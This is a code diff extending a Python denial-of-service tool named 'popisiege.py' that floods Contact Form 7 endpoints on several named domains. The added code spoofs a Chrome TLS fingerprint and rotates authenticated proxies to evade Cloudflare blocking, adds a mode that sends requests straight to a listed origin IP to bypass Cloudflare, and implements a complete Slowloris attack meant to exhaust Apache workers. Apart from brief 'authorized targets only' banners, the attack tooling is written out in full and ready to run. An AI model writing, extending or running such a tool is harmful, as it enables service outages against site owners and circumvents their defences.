@@ -9,13 +9,23 @@ Usage:
   python3 popisiege.py
   python3 popisiege.py --target metoo-buffalo.com
   python3 popisiege.py --target metoo-shatkin.com --concurrency 30
+  python3 popisiege.py --origin 104.236.68.226                   # PoC: bypass CF, hit origin directly
+  python3 popisiege.py --origin 104.236.68.226 --concurrency 5   # gentle probe for log evidence
+  python3 popisiege.py --slowloris --origin 104.236.68.226        # Slowloris: exhaust Apache workers
+  python3 popisiege.py --slowloris --origin 104.236.68.226 --connections 200 --interval 10
   python3 popisiege.py --help
 """
 
 import requests, time, sys, threading, itertools, argparse, subprocess
-import os
+import os, socket, random
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from datetime import datetime
+from curl_cffi import requests as cf_requests
+from curl_cffi import CurlMime
+
+# Chrome TLS/JA3 fingerprint to impersonate — plain `requests`/curl present a
+# distinct fingerprint that Cloudflare blocks even with a spoofed UA string.
+IMPERSONATE = "chrome124"
 
 G = "\033[0;32m"; R = "\033[0;31m"; Y = "\033[0;33m"
 C = "\033[0;36m"; W = "\033[0m";    B = "\033[1m"
@@ -52,12 +62,33 @@ TARGETS = {
 
 class ProxyPool:
     def __init__(self, path):
+        # Authenticated proxy lists (Webshare etc.) ship as bare host:port —
+        # credentials come from PROXY_USER/PROXY_PASS env vars at load time,
+        # so no secret ever lands in a file that could get committed.
+        user = os.environ.get("PROXY_USER", "")
+        pw   = os.environ.get("PROXY_PASS", "")
         with open(path) as f:
             raw = [l.strip() for l in f if l.strip()]
-        self.proxies = [
-            p if p.startswith(("http","socks")) else f"http://{p}"
-            for p in raw
-        ]
+        self.proxies = []
+        for p in raw:
+            if p.startswith(("http://", "https://", "socks")):
+                self.proxies.append(p)
+            elif "@" in p:
+                # host:port:user:pass  (Webshare export format)
+                parts = p.split(":")
+                if len(parts) == 4:
+                    h, port, u, pwd = parts
+                    self.proxies.append(f"http://{u}:{pwd}@{h}:{port}")
+                else:
+                    self.proxies.append(f"http://{p}")
+            elif p.count(":") == 3:
+                # host:port:user:pass  (Webshare export format)
+                h, port, u, pwd = p.split(":")
+                self.proxies.append(f"http://{u}:{pwd}@{h}:{port}")
+            elif user and pw:
+                self.proxies.append(f"http://{user}:{pw}@{p}")
+            else:
+                self.proxies.append(f"http://{p}")
         self._cycle = itertools.cycle(self.proxies)
         self._lock  = threading.Lock()
         self._dead  = set()
@@ -104,6 +135,20 @@ def build_files(form_id, unit_tag):
     }
 
 
+def build_multipart(form_id, unit_tag):
+    """curl_cffi needs CurlMime, not the requests-style files dict."""
+    mp = CurlMime()
+    mp.addpart(name="_wpcf7", data=form_id)
+    mp.addpart(name="_wpcf7_version", data="6.1.6")
+    mp.addpart(name="_wpcf7_locale", data="en_US")
+    mp.addpart(name="_wpcf7_unit_tag", data=unit_tag)
+    mp.addpart(name="your-name", data="Test User")
+    mp.addpart(name="your-email", data="test@test.com")
+    mp.addpart(name="your-subject", data="Test")
+    mp.addpart(name="your-message", data="Hello")
+    return mp
+
+
 # ─────────────────────────────────────────────────────────────────────────────
 #  SINGLE REQUEST
 # ─────────────────────────────────────────────────────────────────────────────
@@ -113,20 +158,199 @@ def send_one(req_num, cfg, pool):
     if not proxy:
         return req_num, 0, 0, "N/A", "none", "all proxies dead"
 
-    s = requests.Session()
-    s.proxies = {"http": proxy, "https": proxy}
-    s.headers.update({"User-Agent": BROWSER_UA})
+    domain = cfg["url"].split("/")[2]
 
     t0 = time.time()
     try:
-        r       = s.post(cfg["url"], files=build_files(cfg["form_id"], cfg["unit_tag"]), timeout=25)
+        r = cf_requests.post(
+            cfg["url"],
+            multipart=build_multipart(cfg["form_id"], cfg["unit_tag"]),
+            headers={"Origin": f"https://{domain}", "Referer": f"https://{domain}/"},
+            proxies={"http": proxy, "https": proxy},
+            impersonate=IMPERSONATE,
+            timeout=25,
+        )
         elapsed = time.time() - t0
         cache   = r.headers.get("cf-cache-status", "N/A")
-        return req_num, r.status_code, elapsed, cache, proxy, None
+        mit     = r.headers.get("cf-mitigated", "")
+        # cf-mitigated present = Cloudflare intercepted, not the origin
+        code    = r.status_code if not mit else 999
+        return req_num, code, elapsed, cache, proxy, (f"cf-mitigated={mit}" if mit else None)
     except Exception as e:
         elapsed = time.time() - t0
         pool.mark_dead(proxy)
         return req_num, 0, elapsed, "N/A", proxy, str(e)[:40]
+
+
+def send_one_direct(req_num, cfg, origin_ip):
+    """
+    --origin mode: bypass Cloudflare entirely.
+    Hits origin IP directly with Host header — appears in Apache logs
+    WITHOUT CF-Connecting-IP header. Proves direct origin attack for PoC/legal.
+    """
+    domain   = cfg["url"].split("/")[2]
+    path     = "/" + "/".join(cfg["url"].split("/")[3:])
+    # Use HTTP (port 80) — HTTPS would fail cert check on raw IP
+    url      = f"http://{origin_ip}{path}"
+
+    s = requests.Session()
+    s.headers.update({
+        "User-Agent": BROWSER_UA,
+        "Host":       domain,
+        "Origin":     f"https://{domain}",
+        "Referer":    f"https://{domain}/",
+    })
+    s.verify = False
+
+    t0 = time.time()
+    try:
+        r       = s.post(url, files=build_files(cfg["form_id"], cfg["unit_tag"]), timeout=15)
+        elapsed = time.time() - t0
+        # Key evidence: CF-Connecting-IP absent = direct hit, not CF-proxied
+        cf_ip   = r.headers.get("CF-Connecting-IP", "ABSENT")
+        via_cf  = r.headers.get("Via", "ABSENT")
+        return req_num, r.status_code, elapsed, cf_ip, via_cf, None
+    except Exception as e:
+        elapsed = time.time() - t0
+        return req_num, 0, elapsed, "ABSENT", "ABSENT", str(e)[:60]
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+#  SLOWLORIS
+# ─────────────────────────────────────────────────────────────────────────────
+
+def _sl_open_socket(host, port, domain):
+    """
+    Slowloris socket init: complete TCP handshake, send partial HTTP headers.
+    Never sends the final blank line — server hangs waiting for the rest.
+    """
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.settimeout(4)
+    try:
+        s.connect((host, port))
+        s.send(f"GET /?r={random.randint(0, 99999)} HTTP/1.1\r\n".encode())
+        s.send(f"Host: {domain}\r\n".encode())
+        s.send(b"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
+               b"AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36\r\n")
+        s.send(b"Accept: text/html,application/xhtml+xml,*/*;q=0.8\r\n")
+        s.send(b"Accept-Language: en-US,en;q=0.5\r\n")
+        s.send(b"Connection: keep-alive\r\n")
+        # intentionally NO final \r\n — request stays incomplete
+        return s
+    except socket.error:
+        try: s.close()
+        except: pass
+        return None
+
+
+def _sl_server_alive(host, port, domain):
+    """Quick HEAD check — returns True if server responds at all."""
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.settimeout(3)
+    try:
+        s.connect((host, port))
+        s.send(f"HEAD / HTTP/1.0\r\nHost: {domain}\r\n\r\n".encode())
+        resp = s.recv(16)
+        s.close()
+        return len(resp) > 0
+    except Exception:
+        try: s.close()
+        except: pass
+        return False
+
+
+def run_slowloris(host, port, domain, max_connections, interval):
+    """
+    Slowloris attack: hold open max_connections partial-HTTP sockets.
+    Every interval seconds, drip one header line to reset server timeout.
+    Apache's MaxRequestWorkers (default 150) fills up → new requests refused.
+    """
+    sockets       = []
+    total_dead    = 0
+    start         = time.time()
+
+    print(f"""
+{B}{'='*66}{W}
+  PopiSiege — SLOWLORIS MODE
+{B}{'='*66}{W}
+  Target      : {host}:{port}
+  Domain      : {domain}
+  Connections : up to {max_connections}
+  Drip rate   : every {interval}s
+  Attack      : Partial HTTP headers — never complete request
+  Effect      : Exhausts Apache MaxRequestWorkers (~150 default)
+{R}  WARNING     : Authorized targets only.{W}
+{B}{'='*66}{W}
+""")
+
+    # ── Phase 1: flood open connections ──────────────────────────────────────
+    print(f"  {Y}[PHASE 1]{W} Opening {max_connections} sockets...")
+    for i in range(max_connections):
+        s = _sl_open_socket(host, port, domain)
+        if s:
+            sockets.append(s)
+        if (i+1) % 25 == 0 or i == max_connections - 1:
+            failed = (i+1) - len(sockets)
+            print(f"\r    Opened={len(sockets)}  Failed={failed}  ({i+1}/{max_connections})",
+                  end="", flush=True)
+    print()
+
+    print(f"\n  {G}[PHASE 1 DONE]{W} Holding {len(sockets)} connections open\n")
+
+    # ── Phase 2: drip loop ────────────────────────────────────────────────────
+    print(f"  {Y}[PHASE 2]{W} Drip loop — header every {interval}s. Ctrl+C to stop.\n")
+
+    round_num = 0
+    try:
+        while True:
+            round_num += 1
+            ts = datetime.now().strftime("%H:%M:%S")
+
+            # Send one partial header line on every live socket
+            dead_idx = []
+            for i, s in enumerate(sockets):
+                try:
+                    s.send(f"X-a: {random.randint(1, 9999)}\r\n".encode())
+                except socket.error:
+                    dead_idx.append(i)
+
+            # Replace dead sockets with fresh ones
+            for i in reversed(dead_idx):
+                sockets.pop(i)
+                total_dead += 1
+                ns = _sl_open_socket(host, port, domain)
+                if ns:
+                    sockets.append(ns)
+
+            alive = _sl_server_alive(host, port, domain)
+            status_str = (R + "DOWN  ⚠️  Workers likely exhausted" + W
+                          if not alive else G + "ALIVE" + W)
+
+            print(f"  {C}[Round {round_num:>4}]{W} {ts} | "
+                  f"Sockets={len(sockets)}/{max_connections} | "
+                  f"Dead(total)={total_dead} | "
+                  f"Server={status_str} | "
+                  f"Runtime={time.time()-start:.0f}s")
+
+            time.sleep(interval)
+
+    except KeyboardInterrupt:
+        print(f"\n\n  {Y}[STOPPED]{W} Ctrl+C\n")
+        print(f"  Closing {len(sockets)} hanging sockets...")
+        for s in sockets:
+            try: s.close()
+            except: pass
+
+    runtime = time.time() - start
+    print(f"\n{B}{'='*66}{W}")
+    print(f"  SLOWLORIS SUMMARY")
+    print(f"{B}{'='*66}{W}")
+    print(f"  Target      : {host}:{port}  ({domain})")
+    print(f"  Runtime     : {runtime:.0f}s")
+    print(f"  Rounds      : {round_num}")
+    print(f"  Peak open   : {max_connections}")
+    print(f"  Total dead  : {total_dead}")
+    print(f"{B}{'='*66}{W}\n")
 
 
 # ─────────────────────────────────────────────────────────────────────────────
@@ -171,7 +395,41 @@ def main():
                    help="Show every request")
     p.add_argument("--delay",       type=float, default=0,
                    help="Seconds between bursts (default: 0)")
+    p.add_argument("--origin",      default=None, metavar="IP",
+                   help="PoC mode: bypass Cloudflare, hit origin IP directly\n"
+                        "Example: --origin 104.236.68.226\n"
+                        "Requests appear in Apache logs WITHOUT CF-Connecting-IP\n"
+                        "Proves direct origin attack for legal/court evidence")
+    p.add_argument("--slowloris",   action="store_true",
+                   help="Slowloris mode: exhaust Apache connection pool with partial HTTP sockets\n"
+                        "Use with --origin to bypass Cloudflare (CF absorbs Slowloris at edge)\n"
+                        "Example: --slowloris --origin 104.236.68.226")
+    p.add_argument("--connections", type=int, default=200,
+                   help="Slowloris: max hanging connections (default: 200, Apache default limit=150)")
+    p.add_argument("--interval",    type=float, default=10,
+                   help="Slowloris: seconds between header drips (default: 10)")
+    p.add_argument("--port",        type=int, default=80,
+                   help="Slowloris: target port (default: 80; use 8080 if needed)")
     args = p.parse_args()
+
+    # ── slowloris: domain not required, can run standalone with --origin ─────
+    if args.slowloris:
+        if args.origin:
+            sl_host   = args.origin
+            sl_domain = args.target.replace("https://","").replace("http://","").strip("/")
+        else:
+            # no --origin: resolve domain to IP (goes through CF edge — less effective on origin)
+            sl_domain = args.target.replace("https://","").replace("http://","").strip("/")
+            try:
+                sl_host = socket.gethostbyname(sl_domain)
+            except socket.gaierror as e:
+                print(f"\n  {R}[ERROR]{W} Cannot resolve {sl_domain}: {e}\n"
+                      f"  Tip: use --origin <IP> to bypass Cloudflare and hit origin directly.\n")
+                sys.exit(1)
+            print(f"\n  {Y}[WARN]{W} No --origin given. Resolved {sl_domain} → {sl_host}")
+            print(f"  {Y}[WARN]{W} Cloudflare will absorb this. Use --origin for origin testing.\n")
+        run_slowloris(sl_host, args.port, sl_domain, args.connections, args.interval)
+        return
 
     # ── resolve target ────────────────────────────────────────────────────────
     domain = args.target.replace("https://","").replace("http://","").strip("/")
@@ -192,6 +450,52 @@ def main():
         print(f"  Run: python3 proxy_tester.py\n")
         sys.exit(1)
 
+    # ── origin PoC mode ───────────────────────────────────────────────────────
+    if args.origin:
+        print(f"""
+{B}{'='*66}{W}
+  PopiSiege — ORIGIN BYPASS MODE (PoC / Legal Evidence)
+{B}{'='*66}{W}
+  Origin IP   : {args.origin}
+  Domain      : {domain}
+  Endpoint    : http://{args.origin}/<cf7-path>
+  Host Header : {domain}
+  Concurrency : {concurrency} per burst
+  Mode        : Direct origin hit — bypasses Cloudflare entirely
+  Evidence    : CF-Connecting-IP=ABSENT in response = direct attack proof
+{R}  WARNING     : Requests hit origin server directly — will appear in{W}
+{R}              : Apache logs. Use only on authorised targets.{W}
+{B}{'='*66}{W}
+""")
+        total_ok = 0; total_err = 0; burst_num = 0; start = time.time()
+        try:
+            while True:
+                burst_num += 1
+                ts = datetime.now().strftime("%H:%M:%S")
+                with ThreadPoolExecutor(max_workers=concurrency) as ex:
+                    futures = [ex.submit(send_one_direct, i, cfg, args.origin)
+                               for i in range(1, concurrency+1)]
+                    for f in as_completed(futures):
+                        num, code, elapsed, cf_ip, via, err = f.result()
+                        sym = G+"[✓]"+W if code in (200,403) else R+"[✗]"+W
+                        hit_type = (R+"DIRECT HIT (no CF)"+W
+                                    if cf_ip == "ABSENT"
+                                    else G+"CF-proxied"+W)
+                        status = f"HTTP={code or 'ERR':<3} | {elapsed:.2f}s | CF-IP={cf_ip} | {hit_type}"
+                        if err: status += f" | {err}"
+                        print(f"  {sym} [{ts}] Req {num:>2} | {status}")
+                        if code in (200, 403): total_ok += 1
+                        else: total_err += 1
+                print(f"  {C}[Burst {burst_num}]{W} Done | "
+                      f"OK={total_ok} ERR={total_err} | Runtime={time.time()-start:.0f}s\n")
+                if args.delay > 0:
+                    time.sleep(args.delay)
+        except KeyboardInterrupt:
+            print(f"\n  {Y}[STOPPED]{W} Ctrl+C\n"
+                  f"  Total direct hits: {total_ok+total_err} | "
+                  f"Runtime: {time.time()-start:.0f}s\n")
+        return
+
     print(f"""
 {B}{'='*66}{W}
   PopiSiege VPS — CF7 Worker Exhaustion
@@ -201,7 +505,7 @@ def main():
   Unit Tag    : {cfg['unit_tag']}
   Concurrency : {concurrency} per burst  (threshold = {cfg['threshold']})
   Proxies     : {pool.alive()} alive — rotating per request
-  User-Agent  : Chrome/124 (browser)
+  TLS         : impersonating {IMPERSONATE} (JA3/JA4 fingerprint, not just UA)
   Mode        : Continuous until Ctrl+C
 {B}{'='*66}{W}
 """)
